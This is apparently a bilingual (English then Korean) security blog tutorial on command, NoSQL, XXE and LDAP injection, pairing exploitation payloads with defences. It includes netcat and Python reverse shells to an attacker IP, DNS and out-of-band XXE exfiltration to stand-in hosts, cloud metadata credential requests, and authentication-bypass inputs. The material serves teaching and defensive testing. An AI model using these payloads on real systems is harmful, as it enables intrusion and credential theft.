---
title: Injection Attacks Beyond SQL and XXS
tags: Injection-Attacks
key: page-injection_attacks
categories: [Cybersecurity, Web Security]
author: hyoeun
math: true
mathjax_autoNumber: true
---

### 1. Command Injection: The Shell is the Limit

Command Injection is one of the most critical vulnerabilities we can encounter. A successful attack can lead beyond simple data theft to the 'Holy Grail' of gaining direct control over the server.

#### **The Core Concept**

This vulnerability occurs when an application takes user input and passes it to an OS command, allowing an attacker to execute arbitrary system commands due to improper input validation and handling.

#### **Primary Attack Vectors**

This is often found in features where developers call the system shell directly for convenience.

  * **Diagnostic Tools**: Web interfaces that provide `ping`, `nslookup`, or `traceroute` functionality.
  * **File Handling**: Features for image conversion (e.g., ImageMagick), file compression/decompression, or file format conversion.
  * **Source Code Integration**: Git-related functions (e.g., repository cloning, log viewing).
  * **Legacy CGI Scripts**

#### **Exploitation Techniques**

A systematic approach is needed, going beyond a simple `whoami`.

1.  **Discovering Command Separators**: You must test various separators to bypass filtering environments.

      * **`;`**: Executes the second command even if the first one fails (most common).
      * **`&&`**: Executes the second command only if the first one succeeds.
      * **`||`**: Executes the second command only if the first one fails.
      * **`|`**: Pipes the output of the first command to the input of the second.
      * **Newline characters**: `%0a` or `\n`.
      * **Backticks (`` ` ``) or `$()`**: Command Substitution. Uses the execution result of one command as an argument for another.

    **Payload Example (Blind Command Injection):**
    `127.0.0.1; sleep 10` - Determines if a vulnerability exists by checking if the response is delayed by 10 seconds.

2.  **Data Exfiltration**:

      * **In-band**: `127.0.0.1; cat /etc/passwd` - Used when the command execution result is directly exposed on the webpage.
      * **Out-of-band (OAST)**: ` nslookup  `whoami`.your-burp-collaborator-domain.com` - Used when a direct response is difficult to obtain due to a firewall; data is exfiltrated externally using DNS queries.

3.  **Reverse Shell - The Ultimate Goal**:
    The key is to obtain a shell on the server, moving beyond single command injections. Various payloads are used depending on the environment.

    **Classic Netcat Reverse Shell:**
    `ip_address; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f`

    **Python Reverse Shell (if Netcat is unavailable):**
    `ip_address; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

#### **Defensive Strategies**

When reporting this vulnerability, you must present specific defensive strategies to the development team.

1.  **Forbid Direct OS Command Calls**: It should be recommended to avoid using functions that directly call the system shell, such as `system()` and `exec()`, and instead use the built-in APIs provided by the programming language. For example, to check if a file exists, using `os.path.exists(filename)` instead of `os.system("ls " + filename)` is a fundamental solution.

2.  **Separate Commands and Arguments**: If external commands must be executed, the command and its arguments should be passed separately to prevent user input from being interpreted by the shell.

      * **Python Example:** By using the `shell=False` option and passing arguments as an array, like `subprocess.run(['ls', '-l', user_input], shell=False)`, the `user_input` is treated as a simple string, and shell metacharacters are not interpreted.

3.  **Input Validation and Escaping**: As a last resort, apply validation based on an 'Allow List' that accepts only permitted characters and guide the team to escape metacharacters with special meaning in the shell (`; | & $ > < \` ' "\`). However, this method is not recommended as it is prone to bypass.

-----

### 2. NoSQL Injection: Abusing the Flexibility of Modern Databases

With the rise of NoSQL databases like MongoDB, Cassandra, and Redis, a new form of injection has emerged. Although the syntax differs from SQL, the fundamental vulnerability of dynamically constructing queries from untrusted user input remains the same.

#### **The Core Concept**

This attack involves injecting query operators, instead of data, into NoSQL queries (often in JSON object format) to bypass authentication or manipulate data.

#### **Primary Attack Vectors**

  * Anywhere that interacts with the database, such as login forms, user profile views/modifications, and search functions.
  * Especially in parts of RESTful API endpoints that process JSON input.

#### **Exploitation Techniques**

Just as `' or '1'='1` is to SQLi, **Operator Injection** is key in NoSQL.

**Payload Example (MongoDB - Authentication Bypass):**

A typical login query looks like this:
`db.users.findOne({username: "user_input", password: "password_input"})`

1.  **Not Equal (`$ne`)**: When the password is unknown, present a condition of 'anything but a specific value'.

      * **User Input (Password field):** `{"$ne": null}`
      * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$ne": null}})`
      * If the `admin` account's password is not null, this evaluates to `true`, and the login succeeds.

2.  **Greater Than (`$gt`)**: Uses a condition of being greater than a certain value.

      * **User Input (Password field):** `{"$gt": ""}`
      * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$gt": ""}})`
      * If the `admin` account's password is greater than an empty string, this evaluates to `true`, and the login succeeds.

3.  **Regex (`$regex`)**: String comparison using regular expressions.

      * **User Input (Password field):** `{"$regex": "^a"}`
      * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$regex": "^a"}})`
      * Checks if the password starts with 'a'. This can be used to infer the password one character at a time in a Blind fashion.

4.  **Server-Side Javascript Injection**: Some older MongoDB versions or specific libraries (`$where`, `mapReduce`) allow server-side Javascript execution. This is a critical vector that can lead to Command Injection.

      * **Payload Example:** `db.collection.find({$where: "sleep(5000)"})` - Vulnerable if a 5-second delay occurs.

#### **Defensive Strategies**

1.  **Forbid String-Based Query Construction**: It should be strongly recommended that developers do not assemble query strings, such as JSON, directly from user input.

2.  **Use an ODM (Object-Document Mapper)**: Recommend the use of ODM libraries like Mongoose (Node.js) or MongoEngine (Python). ODMs allow developers to interact with the database in an object-oriented way and handle secure query generation internally. This serves the same role as Prepared Statements in SQL.

3.  **Enforce Input Type**: Before processing user input on the server, always cast it to the expected data type (e.g., String, Integer). Attacks like `password: {"$ne": null}` occur when the `password` field is treated as an object instead of a string, so type enforcement is an effective defense.

4.  **Filter Operators**: It can be suggested to add logic to detect and block keywords starting with a `$` character (e.g., `$ne`, `$gt`, `$where`) in user input.

-----

### 3. XML Injection & XXE: The Deceptive Data Format

XML is still widely used, from legacy SOAP APIs to modern configuration files. While XPath Injection focuses on manipulating queries, XML Injection and its final evolution, XXE, attack the XML parser itself, causing much more severe damage.

#### **XML Injection vs. XXE**

  * **XML Injection**: Manipulates the structure of an XML document to insert nodes like `isAdmin`, attacking the application's business logic.
  * **XXE (XML External Entity) Injection**: Exploits the 'external entity' feature of XML, causing the server to load external resources to read internal server files or scan the internal network. **This is the real threat.**

#### **Exploiting XXE**

XXE occurs by declaring an external entity through a DTD (Document Type Definition).

1.  **File Disclosure (Classic XXE)**: Exfiltrates local files from the server.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
    ```

    When the payload above is sent, the XML parser replaces `&xxe;` with the content of the `/etc/passwd` file and includes it in the response.

2.  **SSRF (Server-Side Request Forgery)**: Causes the server to make requests to internal or external networks on behalf of the attacker. It is very effective for attacking Metadata APIs (`http://169.254.169.254`) in cloud environments.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
    ```

3.  **Blind XXE (Out-of-band)**: When there is no direct response, data is exfiltrated by loading an external DTD.

    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://your-server.com/?file=%file;'>">
    %eval;
    %exfiltrate;

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://your-server.com/evil.dtd"> %xxe;]>
    <stockCheck><productId>123</productId></stockCheck>
    ```

#### **Defensive Strategies**

The defense methods for XXE are very clear. You must include the following in your report.

1.  **Disable External Entities and DTDs**: The most certain and fundamental solution is to disable external entity and DTD processing by changing the XML parser's settings. Most modern XML parsers have this disabled by default, but it is often enabled in legacy systems.

      * **Java Example:**
        ```java
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // Core settings to prevent XXE
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);
        ```
      * **Python (lxml) Example:**
        ```python
        from lxml import etree
        # Block external entity loading with resolve_entities=False
        parser = etree.XMLParser(resolve_entities=False)
        tree = etree.parse(xml_file, parser)
        ```

2.  **Filter Untrusted XML Input**: If disabling DTDs is not possible in the environment, you must inspect and block user input that contains keywords such as `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, and `PUBLIC`.

-----

### 4. LDAP Injection: The Corporate Directory's Weakness

LDAP Injection is a powerful weapon when testing authentication mechanisms in a corporate environment. Many companies use LDAP-based systems like Active Directory to handle user authentication and information lookups.

#### **Exploiting LDAP**

The key is to manipulate the LDAP filter syntax `(attribute=value)`.

  * **Authentication Bypass**:

      * **Payload:** `*)(uid=*))(|(uid=*`
      * By entering the above payload as the username, a filter like `(&(uid=*)(uid=*))(|(uid=*)))` can be constructed, which always evaluates to true, bypassing authentication.

  * **Information Enumeration**: Exfiltrates information using wildcards (`*`) and logical operators (`|`, `&`).

      * **Payload:** `(uid=*)` - Induces the return of information for all users.
      * **Payload:** `(|(uid=admin)(uid=guest))` - Checks if an admin or guest user exists.

#### **Defensive Strategies**

1.  **LDAP Escaping**: Characters with special meaning in LDAP filters (e.g., `( ) & | = * \`) must be escaped. Most programming languages provide secure libraries or functions for this, so it should be recommended to use a validated library rather than implementing it directly.

2.  **Strong Input Validation**: When a specific format of input is expected, such as a username or ID, apply 'Allow List' based validation to ensure that no special characters outside of that format are included.

-----

### 1. Command Injection: The Shell is the Limit

Command Injection은 우리가 마주할 수 있는 가장 치명적인 취약점 중 하나입니다. 성공 시, 단순히 데이터를 탈취하는 것을 넘어 서버의 제어권을 직접 획득하는 'Holy Grail'로 이어질 수 있습니다.

#### **The Core Concept**

애플리케이션이 사용자 입력을 받아 OS 커맨드를 실행하는 과정에서, 입력값에 대한 부적절한 검증 및 처리로 인해 공격자가 임의의 시스템 명령어를 실행하게 되는 취약점입니다.

#### **Primary Attack Vectors**

개발자가 편의를 위해 시스템 셸을 직접 호출하는 기능에서 주로 발견됩니다.

  * **진단 도구**: `ping`, `nslookup`, `traceroute` 기능을 제공하는 웹 인터페이스
  * **파일 처리**: 이미지 변환(ImageMagick), 파일 압축/해제, 파일 포맷 변환 기능
  * **소스코드 연동**: Git 관련 기능(저장소 클론, 로그 조회 등)
  * **레거시 CGI 스크립트**

#### **Exploitation Techniques**

단순한 `whoami` 실행을 넘어, 체계적인 접근이 필요합니다.

1.  **명령어 구분자(Command Separator) 탐색**: 필터링 환경을 우회하기 위해 다양한 구분자를 테스트해야 합니다.

      * `;` : 앞의 명령이 실패해도 뒷 명령 실행 (가장 일반적)
      * `&&`: 앞의 명령이 성공해야 뒷 명령 실행
      * `||`: 앞의 명령이 실패해야 뒷 명령 실행
      * `|` : 앞의 명령 결과를 뒷 명령의 입력으로 전달 (Pipe)
      * 줄바꿈 문자: `%0a` 또는 `\n`
      * 백틱(`` ` ``) 또는 `$()`: Command Substitution. 다른 명령어의 실행 결과를 인자로 사용.

    **Payload Example (Blind Command Injection):**
    `127.0.0.1; sleep 10` - 응답 시간이 10초 지연되는지 확인하여 취약점 유무 판단.

2.  **데이터 유출 (Data Exfiltration)**:

      * **In-band**: `127.0.0.1; cat /etc/passwd` - 명령어 실행 결과가 웹페이지에 직접 노출될 때.
      * **Out-of-band (OAST)**: ` nslookup  `whoami`.your-burp-collaborator-domain.com` - 방화벽으로 인해 직접적인 응답을 받기 어려울 때, DNS 쿼리를 이용해 외부에서 데이터를 확인.

3.  **Reverse Shell - The Ultimate Goal**:
    단발성 명령어 주입을 넘어, 서버의 셸을 획득하는 것이 핵심입니다. 환경에 따라 다양한 페이로드가 사용됩니다.

    **Classic Netcat Reverse Shell:**
    `ip_address; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f`

    **Python Reverse Shell (Netcat이 없는 경우):**
    `ip_address; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

#### **방어 전략 (Defensive Strategies)**

보고서에 이 취약점을 보고할 때, 개발팀에게 다음과 같은 구체적인 방어 전략을 제시해야 합니다.

1.  **OS 명령어 직접 호출 금지**: 가능한 한 시스템 셸을 직접 호출하는 `system()`, `exec()` 등의 함수 사용을 피하고, 프로그래밍 언어가 제공하는 내장 API를 사용하도록 권고해야 합니다. 예를 들어, 파일이 존재하는지 확인하고 싶다면 `os.system("ls " + filename)` 대신 `os.path.exists(filename)`를 사용하는 것이 근본적인 해결책입니다.

2.  **명령어와 인자 분리**: 부득이하게 외부 명령어를 실행해야 한다면, 사용자 입력이 셸에 의해 해석되지 않도록 명령어와 인자를 명확하게 분리해서 전달해야 합니다.

      * **Python 예시:** `subprocess.run(['ls', '-l', user_input], shell=False)` 와 같이 `shell=False` 옵션을 사용하고 인자를 배열로 전달하면, `user_input`은 단순한 문자열로 취급되어 셸 메타 문자가 해석되지 않습니다.

3.  **입력값 검증 및 이스케이프**: 최후의 수단으로, 허용된 문자만 받는 'Allow List' 기반의 검증을 적용하고, 셸에서 특별한 의미를 갖는 메타 문자(`; | & $ > < \` ' "\`)를 이스케이프 처리하도록 가이드해야 합니다. 하지만 이 방법은 우회 가능성이 높아 권장되지 않습니다.

-----

### 2. NoSQL Injection: Abusing the Flexibility of Modern Databases

MongoDB, Cassandra, Redis와 같은 NoSQL 데이터베이스의 사용이 증가하면서 새로운 형태의 인젝션이 부상했습니다. SQL과 문법은 다르지만, '사용자 입력을 신뢰하여 쿼리를 동적으로 구성한다'는 근본적인 취약점은 동일합니다.

#### **The Core Concept**

NoSQL 쿼리(주로 JSON 객체 형태)에 데이터 대신 쿼리 연산자를 주입하여 인증을 우회하거나 데이터를 조작하는 공격입니다.

#### **Primary Attack Vectors**

  * 로그인 폼, 사용자 프로필 조회/수정, 검색 기능 등 DB와 상호작용하는 모든 곳.
  * 특히 RESTful API 엔드포인트에서 JSON 입력을 처리하는 부분.

#### **Exploitation Techniques**

SQLi의 `' or '1'='1` 처럼, NoSQL에서는 **연산자 주입(Operator Injection)**이 핵심입니다.

**Payload Example (MongoDB - Authentication Bypass):**

일반적인 로그인 쿼리는 다음과 같습니다.
`db.users.findOne({username: "user_input", password: "password_input"})`

1.  **Not Equal (`$ne`)**: 비밀번호를 모를 때, '특정 값이 아닌 아무거나'를 조건으로 제시.

      * **User Input (Password field):** `{"$ne": null}`
      * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$ne": null}})`
      * `admin` 계정의 비밀번호가 null이 아니기만 하면 `true`가 되어 로그인 성공.

2.  **Greater Than (`$gt`)**: 특정 값보다 크다는 조건을 이용.

      * **User Input (Password field):** `{"$gt": ""}`
      * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$gt": ""}})`
      * `admin` 계정의 비밀번호가 빈 문자열보다 크기만 하면 `true`가 되어 로그인 성공.

3.  **Regex (`$regex`)**: 정규 표현식을 이용한 문자열 비교.

      * **User Input (Password field):** `{"$regex": "^a"}`
      * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$regex": "^a"}})`
      * 비밀번호가 'a'로 시작하는지 확인. 이를 통해 Blind 형태로 비밀번호를 한 글자씩 유추 가능.

4.  **Server-Side Javascript Injection**: 일부 오래된 MongoDB 버전이나 특정 라이브러리(`$where`, `mapReduce`)는 서버 측에서 Javascript 실행을 허용합니다. 이는 Command Injection으로 이어질 수 있는 치명적인 벡터입니다.

      * **Payload Example:** `db.collection.find({$where: "sleep(5000)"})` - 5초 지연 발생 시 취약.

#### **방어 전략 (Defensive Strategies)**

1.  **문자열 기반 쿼리 생성 금지**: 개발자가 사용자 입력을 받아 직접 JSON과 같은 쿼리 문자열을 조립하지 않도록 강력하게 권고해야 합니다.

2.  **ODM(Object-Document Mapper) 사용**: Mongoose(Node.js), MongoEngine(Python)과 같은 ODM 라이브러리 사용을 권장해야 합니다. ODM은 개발자가 객체 지향적인 방식으로 DB와 상호작용하게 하며, 내부적으로 안전한 쿼리 생성을 처리해 줍니다. 이는 SQL의 Prepared Statement와 같은 역할을 합니다.

3.  **입력값 타입 강제**: 사용자 입력값을 서버에서 처리하기 전에 항상 예상되는 데이터 타입(예: String, Integer)으로 강제 변환해야 합니다. `password: {"$ne": null}` 과 같은 공격은 `password` 필드가 문자열이 아닌 객체로 인식될 때 발생하므로, 타입 강제는 효과적인 방어 수단입니다.

4.  **연산자 필터링**: 사용자 입력에서 `$` 문자로 시작하는 키워드(예: `$ne`, `$gt`, `$where`)를 감지하고 차단하는 로직을 추가하도록 제안할 수 있습니다.

-----

### 3. XML Injection & XXE: The Deceptive Data Format

XML은 레거시 SOAP API부터 최신 설정 파일까지 여전히 널리 사용됩니다. XPath Injection이 쿼리 조작에 집중한다면, XML Injection과 그 최종 진화형인 XXE는 XML 파서 자체를 공격하여 훨씬 더 심각한 피해를 유발합니다.

#### **XML Injection vs. XXE**

  * **XML Injection**: XML 문서의 구조를 조작하여 `isAdmin`과 같은 노드를 삽입, 애플리케이션의 비즈니스 로직을 공격.
  * **XXE (XML External Entity) Injection**: XML의 '외부 엔티티' 기능을 악용, 서버가 외부 리소스를 로드하게 만들어 서버 내부 파일을 읽거나 내부 네트워크를 스캔. **이것이 진짜 위협입니다.**

#### **Exploiting XXE**

XXE는 DTD(Document Type Definition)를 통해 외부 엔티티를 선언함으로써 발생합니다.

1.  **File Disclosure (Classic XXE)**: 서버의 로컬 파일을 유출.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
    ```

    위 페이로드가 전송되면, XML 파서는 `&xxe;`를 `/etc/passwd` 파일의 내용으로 치환하여 응답에 포함시킵니다.

2.  **SSRF (Server-Side Request Forgery)**: 서버가 공격자를 대신해 내부 또는 외부 네트워크에 요청을 보내게 함. 클라우드 환경에서 Metadata API (`http://169.254.169.254`)를 공격하는 데 매우 효과적입니다.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
    ```

3.  **Blind XXE (Out-of-band)**: 직접적인 응답이 없을 때, 외부 DTD를 로드하게 만들어 데이터 유출.

    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://your-server.com/?file=%file;'>">
    %eval;
    %exfiltrate;

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://your-server.com/evil.dtd"> %xxe;]>
    <stockCheck><productId>123</productId></stockCheck>
    ```

#### **방어 전략 (Defensive Strategies)**

XXE는 방어 방법이 매우 명확합니다. 보고서에 반드시 다음 내용을 포함시켜야 합니다.

1.  **외부 엔티티(External Entity) 및 DTD 비활성화**: XML 파서의 설정을 변경하여 외부 엔티티와 DTD 처리를 비활성화하는 것이 가장 확실하고 근본적인 해결책입니다. 대부분의 최신 XML 파서는 기본적으로 비활성화되어 있지만, 레거시 시스템에서는 활성화된 경우가 많습니다.

      * **Java 예시:**

        ```java
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // XXE 방지를 위한 핵심 설정
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);
        ```

      * **Python (lxml) 예시:**

        ```python
        from lxml import etree
        # resolve_entities=False 로 외부 엔티티 로드 차단
        parser = etree.XMLParser(resolve_entities=False)
        tree = etree.parse(xml_file, parser)
        ```

2.  **신뢰할 수 없는 XML 입력 필터링**: 만약 DTD 비활성화가 불가능한 환경이라면, 사용자 입력에 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC`과 같은 키워드가 포함되어 있는지 검사하고 차단해야 합니다.

-----

### 4. LDAP Injection: The Corporate Directory's Weakness

기업 환경의 인증 메커니즘을 테스트할 때 LDAP Injection은 강력한 무기입니다. 많은 기업들이 Active Directory와 같은 LDAP 기반 시스템으로 사용자 인증 및 정보 조회를 처리하기 때문입니다.

#### **Exploiting LDAP**

LDAP 필터 문법 `(attribute=value)`을 조작하는 것이 핵심입니다.

  * **Authentication Bypass**:

      * **Payload:** `*)(uid=*))(|(uid=*`
      * 사용자 이름에 위 페이로드를 입력하면, `(&(uid=*)(uid=*))(|(uid=*))`)\` 와 같은 필터가 구성되어 항상 참이 되면서 인증을 우회할 수 있습니다.

  * **Information Enumeration**: 와일드카드(`*`)와 논리 연산자(`|`, `&`)를 이용해 정보를 유출.

      * **Payload:** `(uid=*)` - 모든 사용자의 정보를 반환하도록 유도.
      * **Payload:** `(|(uid=admin)(uid=guest))` - admin 또는 guest 사용자가 존재하는지 확인.

#### **방어 전략 (Defensive Strategies)**

1.  **LDAP 이스케이프 처리**: LDAP 필터에서 특별한 의미를 갖는 문자들( `( ) & | = * \` 등)을 이스케이프 처리해야 합니다. 대부분의 프로그래밍 언어는 이를 위한 안전한 라이브러리나 함수를 제공하므로, 직접 구현하기보다는 검증된 라이브러리를 사용하도록 권고해야 합니다.

2.  **강력한 입력값 검증**: 사용자 이름, ID 등 특정 형식의 입력이 예상되는 경우, 해당 형식을 벗어나는 특수문자가 포함되지 않도록 'Allow List' 기반의 검증을 적용해야 합니다.